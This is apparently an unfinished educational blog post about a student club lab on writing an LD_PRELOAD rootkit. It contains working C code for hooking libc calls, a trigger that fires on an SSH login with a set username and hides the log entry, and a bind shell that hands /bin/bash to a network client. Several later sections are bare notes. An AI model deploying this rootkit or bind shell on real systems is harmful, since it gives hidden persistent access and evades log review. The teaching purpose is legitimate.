# Teaching CS Students the secrets behind (ethical) Malware Engineering

Author: Rory Hemmings
June 7th 2023

**Disclaimer**
> I am not an expert in this topic, and this project is meerly my interpretation/attempt at rootkit development. If you have any suggestions for improvement, please suggest them on github issues in this [repo](https://docs.google.com/presentation/d/1U2sHxWP64e9oxL_PAg-F9cti82FOHWIan8AGZFJG8Ec/edit?usp=drive_link).

For ACM Cyber this spring quarter, we decided to breanch off from our workshop/lecture based style of teaching to try something more practical. To achieve this we offered a "Malware Development Lab" and the "Secure OS development Lab" 2 "Cyber Labs" instead. Both were inteded to be low level cyber-security projects allowing people to get their hands dirty on the development side of cyber. This post details the development process, plans, and results of this quarters Malware Lab. 

## Lab Objectives

Overall we had three major objectives in teaching this lab.

1. Develop fully functional rootkits using low level c
2. Exploit a vulnerability to install our rootkit thus gaining persistent access 
3. Teach students how to apply the fundamentals behind operating systems and network programming to practical malware. 

However, we required little previous knowledge of these subject matters, and thus we had to fit all of these objectives into a total of 10 hours.

As it relates to the exact architecture of the rootkits, we took heavy inspiration from the one developed in this [post](https://h0mbre.github.io/Learn-C-By-Creating-A-Rootkit/). If you are intereseted in what we did, I **highly recommend** you read this post as it contains great in depth technical explanations of many of the features we added.

This included two basic features:
1. A trigger mechanism that calls a function upon ssh login attempts with a trigger username
2. A forked bind shell process started by the trigger mechanism

Additionally, I added some features similar to those detailed in the post including ls and netstat evasion.

In the end these base features gave us a malicious LD_PRELOAD rootkit that provided persistent shell access while hiding from ls and netstat.

## Cirriculum

Our approach was to spend the first three weeks having our attendees developing the base features (trigger, bind shell, exploit script), and then give them the remaining couple of weeks to add their own features. Finally at the end of the quarter we provided them a target server they were tasked to exploit, and then demo their features in front of an audience at our end of quarter symposium.

Our cirriculum followed this structure:

* Week 3: OS concepts + system call hooking + trigger mechanism
* Week 4: networking + bind shell
* Week 5: break for midterms
* Week 6: buffer overflows + exploit script
* Week 7: industry talk + overview of possible features
* Week 8: work session
* Week 9: demos

## System Call Hooking

The core of the rootkit revolves around one basic principle: System Call Hooking. The basic idea is that we want to insert a thin layer between the user and operating system without the users knowledge. That way we can manipulate the information moving between the user and the operating system.

#### System calls 
In order to do anything from file manipulation, programs make use of syscalls to "ask" the operating system to do things. Take for example the basic c hello work program.

```c
#include <stdio.h>

int main(int argc, char** argv)
{
    printf("Hello World\n");
    return 0;
}
```

This program uses the `printf` function, which writes `"Hello World\n"` to standard output. However, writing to standard output is technically file manipulation, and thus it requires operating system intervention. This can be illustrated by looking at the generated machine code.

```s
0000000000001149 <main>:
    1149:	f3 0f 1e fa          	endbr64 
    114d:	55                   	push   rbp
    114e:	48 89 e5             	mov    rbp,rsp
    1151:	48 83 ec 10          	sub    rsp,0x10
    1155:	89 7d fc             	mov    DWORD PTR [rbp-0x4],edi
    1158:	48 89 75 f0          	mov    QWORD PTR [rbp-0x10],rsi
    115c:	48 8d 05 a1 0e 00 00 	lea    rax,[rip+0xea1]        # 2004 <_IO_stdin_used+0x4>
    1163:	48 89 c7             	mov    rdi,rax
    1166:	e8 e5 fe ff ff       	call   1050 <puts@plt>
    116b:	b8 00 00 00 00       	mov    eax,0x0
    1170:	c9                   	leave  
    1171:	c3                   	ret
```

In this case, it uses the `puts` system call (instruction at 0x1166). This system call simply takes a string as input and writes it to stdout.

#### Shared Libraries

As you can imagine, this system call is very widely used. Because of this, it would be very inefficient to save a copy of `puts` in every binary.

Instead it's more efficient to save a single copy of `puts` somewhere on the system, and have all programs on the system share that copy. In facts its even better if we bundle all of the commonly used functions and save them in one place so that all our programs can simply refer to the copy. This process is known as dynamic linking as this library is linked at run time as opposed to compile time (static linking). 

In this case, the library is called a shared library. `puts` is stored in libc (`/lib/libc.so.6`), which contains all of the c functions in the standard library.

#### ld.so.preload

Something interesting about dynamic linking is that you can infuence how it works using environment variables. One such variable is `LD_PRELOAD`. Setting this variable allows you to change the order in which dynamic libraries are loaded. Specifically, it contains the path of shared libraries you want to load first.

This is extremely powerful because it allows us to effectively overwrite the code for libc system calls.

> Note, you can also write to the file `/etc/ld.so.preload` to achieve a more permenant effect

#### System Call Hooking

In essence, a syscall hook is simply a wrapper around an existing syscall. Generally we use this to filter the incoming or outgoing data from a system call. As syscalls act as a portal into the operating system, this means that we can control the traffic between user programs and the OS.

Below is an example of how we can hook the `puts` syscall to replace the message "cat" with the word "dog"

```c
/* Hooked Syscall - overrides actual puts syscall */
int puts(const char *message)
{
	/* function pointer for original puts syscall (not yet initialized) */
	int (*real_puts)(const char *message);

	/* 
	 * 1. Get address of next "puts" symbol from dynamic linker
	 * 2. assign new_puts to point to it
	 * 3. Now new_puts points to the REAL puts syscall
	 */
	real_puts = dlsym(RTLD_NEXT, "puts");

	/* If write is attempting to write our target string,
	 	 inject our subsequent payload instead */
	if (strcmp(message, "cat") == 0)
		return real_puts("dog");

 	/* Otherwise simply forward call to REAL puts */
	return real_puts(message);
}
```

Next, we compile this code into a shared library and put the path in the `/etc/ld.so.preload` file. After doing so, running the following program will produce interesting results.

```c
int main()
{
    printf("cat");
    return 0;
}
```

```
$ gcc -o cat cat.c
$ ./cat
dog
$
```

As we can see, we have directly manipulated the operation printf call. The program is correctly using the `printf` function, however it is not behaving as expected.

At the heart of this example is the `dlsym` call. While it looks complicated, it simply retrieves the next dynamically linked occurance of the `puts` symbol. Since our library was loaded before libc, the next occurance is the original `puts` syscall in libc. Since `real_puts` is a function pointer, this line simply initializes `real_puts` to the address of the real `puts` function. This allows us to "wrap" the `puts` syscall with our own "filter".

Since our library is loaded before libc, any program calling `printf`, and be extension `puts`, will actually be calling our `puts` function. What this means is that any program on the entire system that wants to print "cat" to stdout, will actually end up printing "dog" instead. Critically however, any call to puts that isn't literally printing "cat" is left completely untouched. 

While this example is relatively inocuous, it gives us a window into the potential of this feature. Not only can it be used to arbitrarily execute code, but it can also be used to cover up evidence of the rootkit entirely. 

#### Trigger Mechanism

ssh logs
write syscall

```c
#define TRIGGER_USERNAME "joebruin"

void start_bind4()
{
  printf("The Hacking Has Begun\n");
}

ssize_t write(int fildes, const void *buf, size_t nbytes) {
	ssize_t (*real_write) (int fildes, const void *buf, size_t nbytes);
	ssize_t result;

	real_write = dlsym(RTLD_NEXT, "write");

	/* Message doesn't conain trigger */
	if (strstr(buf, TRIGGER_USERNAME) == NULL) {
		return real_write(fildes, buf, nbytes);
	}

	/* write original bytes to /dev/null to hide ouput from log */
	fildes = open("/dev/null", O_WRONLY | O_APPEND);
	result = real_write(fildes, buf, nbytes);

	/* Open the bind shell backdoor */
	start_bind4();

	return result;
}
```

## Bind Shell

At this point, we had single hook that called a function when a user attempted to ssh into the server with a trigger username. Given the next goal for our rootkit was persistent access, we decided to write code to set up a bind shell whenever the user used the trigger mechanism.

```c
void start_bind4()
{
	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(BIND_PORT);
	addr.sin_addr.s_addr = INADDR_ANY;

	int sockfd = socket(AF_INET, SOCK_STREAM, 0);

	/* allow reuse of local address */
	const static int optval = 1;
	setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

	/* bind socket to local address */
	bind(sockfd, (struct sockaddr*) &addr, sizeof(addr));
	listen(sockfd, 0);

	int client_sockfd = accept(sockfd, NULL, NULL);
	int pid = fork();
	if (pid == 0) {
	    for (int i = 0; i < 3; i++)
		    dup2(client_sockfd, i);

		execve("/bin/bash", NULL, NULL);
	}
	close(sockfd);
}
```

The first several statments are fairly standard networking C code. They simply create a socket, bind it to the ip address of the server, listen for a connection, and accept the first client connection on the specified port.

Next, the program forks, creating a copy of the running process (the ssh daemon in this case). Next the function `dup2` overwrites the stdout, stdin, and stderr file descriptiors with the socket, effectively rerouting stdin, stdout, and stderr to the connection. Finally, the program execs a shell, replacing the currently running process (forked version) with the shell program.

In the end this spawns a separate shell process with its input and output routed to the client.

The client can then connect to this shell using netcat.
```
nc TARGET_ADDRESS BIND_PORT
```

The reason we call it a bind shell is because we bind the socket to the target's address. This indicates that the target acts as the server, and the client (attacker in this case) connects to the target. Conversely, we could have created a reverse shell where the target acts as the client that connects to the attackers Command and Control server to control the target.

## Target Environment

docker container on aws
running ssh
running apache
running target program
objective, break into target program, get persistent access, modify website

## Exploitation

## Developed Features

evasion
javascript injection
shred

## Complications

setup was arduous
we spent more time 
probably better to have bigger groups
we could cut back on lectures even more

making the docker container more flimsy

## Conclusion

This quarter the malware lab was a major learning experience.

## References

[Techincal Breakdown of similar LD_PRELOAD rootkit](https://h0mbre.github.io/Learn-C-By-Creating-A-Rootkit/).
[repo](https://github.com/RoryHemmings/cyber-rootkit-s23) 
[discord](https://discord.gg/j9dgf2q):

Slides:
* [week 1](https://docs.google.com/presentation/d/1EFRjWrZO-xo2kFhywVZy9M7Y5B-amZuXKzCrS-XNfLQ/edit?usp=drive_link)
* [week 2](https://docs.google.com/presentation/d/19CA9Lu7Mfybz7OL6jksWFF0hEyisUwTRJRgKflugenY/edit?usp=drive_link)
* [week 3](https://docs.google.com/presentation/d/1U2sHxWP64e9oxL_PAg-F9cti82FOHWIan8AGZFJG8Ec/edit?usp=drive_link)